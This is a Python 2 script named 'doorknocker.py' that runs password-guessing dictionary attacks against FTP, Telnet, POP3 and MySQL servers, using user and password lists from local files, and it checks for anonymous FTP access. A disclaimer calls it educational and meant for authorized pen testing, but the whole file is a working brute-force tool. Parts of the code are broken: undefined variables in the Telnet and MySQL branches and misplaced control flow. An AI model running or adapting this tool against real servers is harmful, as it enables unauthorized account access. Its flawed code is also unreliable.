#!/usr/bin/python
# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!
# You need to download the MySQLdb API from http://sourceforge.net/projects/mysql-python 
# save all users list at users.txt and passwords list at pass.txt in the same directory

import sys ,time , os,string,ftplib,telnetlib,poplib
from ftplib import FTP
import MySQLdb

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

os.system(SysCls)

print "\n|---------------------------------------------------------------|"
print "| beenudel1986[@]gmail[dot]com                                  |"
print "|   10/2008      doorknocker.py                                 |"
print "|   Do Visit     www.BeenuArora.com      &        darkc0de.com  |"
print "|   Save Userlist at users.txt   and Password list at pass.txt  |"
print "|---------------------------------------------------------------|\n"


print "\n\t Enter the D00r ( FTP or POP or Telnet or Mysql)" 		
door=raw_input()
door=string.upper(door)
if door=='FTP':
		print "\n\t Enter the server address to be cracked"
		server=raw_input()

		try:
  			users = open('users.txt', "r").readlines()
		except(IOError): 
  			print "Error: Check your for filename users.txt\n"
  			sys.exit(1)

		try:
  			words = open('pass.txt', "r").readlines()
		except(IOError): 
  			print "Error: Check your wordlist pass.txt\n"
  			sys.exit(1)
		
		print "[+] Server:",server
		print "[+] User Loaded:",len(users)
		print "[+] Words Loaded:",len(words),"\n"
		try:
			f = FTP(server)
			print "[+] Response:",f.getwelcome()
		except (ftplib.all_errors):
			pass

		try:
			print "\n[+] Checking for anonymous login\n"
			ftp = FTP(server)
			ftp.login()
			ftp.retrlines('LIST')
			print "\t\nAnonymous login successful!!!\n"
			ftp.quit()
		except (ftplib.all_errors): 
			print "\tAnonymous login unsuccessful\n"
		for user in users:

			for word in words:
				try:
					print "-"*22
					print "User:",user,"Password:",word
					ftp = FTP(server)
					ftp.login(user[:-1], word[:-1])
					ftp.retrlines('LIST')
					print "\t\nLogin successful:",word, user
					ftp.quit()
					sys.exit(2)
				except (ftplib.all_errors), msg: 
					#print "An error occurred:", msg
					pass

if door=='TELNET':
		print "\n\t Enter the server address to be cracked"
		server=raw_input()
		
		try:
  			users = open('users.txt', "r").readlines()
		except(IOError): 
  			print "Error: Check your userlist at users.txt\n"
  			sys.exit(1)
		try:
			words = open('pass.txt', "r").readlines()
		except(IOError): 
			print "Error: Check your wordlist pass.txt\n"
			sys.exit(1)
			
		print "[+] Server:",server
		print "[+] Users Loaded:",len(users)
		print "[+] Words Loaded:",len(words),"\n"
		for user in users:
			for word in words:
				try:
					print "-"*22
					print "User:",user,"Password:",word
					tn = telnetlib.Telnet(server)
					tn.read_until("login: ")
					tn.write(user + "\n")
					if password:
						tn.read_until("Password: ")
						tn.write(word[:-1] + "\n")
					tn.write("ls\n")
					tn.write("exit\n")
					print tn.read_all()
					print "\t\nLogin successful:",word, user
					tn.close()
					sys.exit(2)
				except: 
					pass
if door=='POP':
		print "\n\t Enter the server address to be cracked"
		server=raw_input()
		
		try:
  			users = open('users.txt', "r").readlines()
		except(IOError): 
  			print "Error: Check your wordlist users.txt\n"
  			sys.exit(1)

		try:
			words = open('pass.txt', "r").readlines()
		except(IOError): 
			print "Error: Check your password file pass.txt\n"
			sys.exit(1)
			
		print "[+] Server:",server
		print "[+] User Loaded:",len(users)
		print "[+] Words Loaded:",len(words),"\n"
		for user in users:
			for word in words:
				try:
					print "-"*22
					print "User:",user,"Password:",word
					pop = poplib.POP3(server)
					pop.user(user)
					pop.pass_(word[:-1])
					print "\t\nLogin successful:",word, user
					print pop.stat()
					pop.quit()
					sys.exit(2)
				except (poplib.error_proto), msg: 
					#print "An error occurred:", msg
					pass

if door=='MYSQL':
		print "\n\t Enter the server address to be cracked"
		server=raw_input()
		try:
  			users = open('users.txt', "r").readlines()
		except(IOError): 
  			print "Error: Check your user wordlist users.txt\n"
  			sys.exit(1)

		print '\n\t Enter the Port number'
		port=raw_input()
		database=raw_input("\n\t Enter the database\n")
		try:
			words = open('pass.txt', "r").readlines()
		except(IOError): 
			print "Error: Check your password wordlist pass.txt\n"
			sys.exit(1)
			
		print "[+] Server:",server
		print "[+] Users Loaded:",len(users),"\n"
		print "[+] Words Loaded:",len(words),"\n"
		for user in users:

			for word in words:
				try:
					print "-"*22
					print "User:",user,"Password:",word
					db=MySQLdb.connect(host=server,user=user,passwd=word,db=database,port=int(port))
					print "\t\nLogin successful:",value, user
					db.close()
					sys.exit(2)
				except(MySQLdb.Error), msg: 
					#print "An error occurred:", msg
					pass
else:
	print "\n Sorry Wrong choice Entered . Exiting.."
	sys.exit(0)
